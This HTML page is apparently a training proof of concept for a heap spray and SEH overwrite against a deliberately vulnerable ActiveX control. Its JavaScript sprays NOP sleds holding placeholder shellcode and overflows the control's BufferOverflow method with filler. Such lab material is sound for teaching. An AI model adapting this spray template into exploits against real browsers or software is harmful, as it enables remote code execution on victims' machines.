<html>
<head>
    <title>vulActiveX.dll Heap Spray SEH Exploit</title>
    <object classid='clsid:C44CBF61-7844-4C4B-BC77-7643FD70848E' id='_vulActiveX'>
    </object>
    <script type="text/javascript" language="javascript">
        //==========================================//
        //		 vulActiveX Heap Spraying SEH		//
        //											//
        //		   HackSys Team - Panthera			//
        //       http://hacksys.vfreaks.com/		//
        //         hacksysteam@hotmail.com			//
        //											//
        //			Author: Ashfaq Ansari			//
        //		ashfaq_ansari1989@hotmail.com		//
        //											//
        //==========================================//

        //shellcode = "HACKSYS!"
        shellcode = unescape('%u4148%u4b43%u5953%u2153');

        nops = unescape('%u9090%u9090');
        headersize = 20;

        //write the output to Internet Explorer's window
        document.write("<H2>vulActiveX.dll Heap Spray Attack</H2></br>");

        //create one block with nops
        document.write("Creating one block of memory with <b>NOPS</b>.</br>");
        slackspace = headersize + shellcode.length;
        while (nops.length < slackspace) nops += nops;
        fillblock = nops.substring(0, slackspace);

        //enlarge block with nops, size 0x50000
        document.write("Enlarging the memory with <b>NOPS</b> of size <b>0x5000</b>.</br>");
        block = nops.substring(0, nops.length - slackspace);
        while (block.length + slackspace < 0x50000) block = block + block + fillblock;

        document.write("Spraying <b>NOPS + SHELLCODE</b> <b>250</b> times.</br>");

        //spray 250 times : nops + shellcode
        memory = new Array();
        for (counter = 0; counter < 250; counter++) {
            memory[counter] = block + shellcode;

            //show the status of spray on Status bar
            window.status = "Spraying: " + Math.round(100 * counter / 250) + "% done";
        }

        document.write("Allocated <b>" + (block.length + shellcode.length).toString() + "</b> bytes.<br>");
        document.write("Heap Spraying completed successfully.<br>");
        window.status = "Launching Exploit";
        alert("Heap Spraying Done\n\n Launching Exploit");
		
		junkA = "";
		while(junkA.length < 1164) junkA += "A";


		next_seh = "BBBB";
		seh = "CCCC";
		
		junkB = "";
		while(junkB.length < 14356) junkB += "D";
		
		payload = junkA + next_seh + seh + junkB;

        //pass the parameter to BufferOverflow method
        _vulActiveX.BufferOverflow(payload);
    </script>
</head>
<body>
</body>
</html>
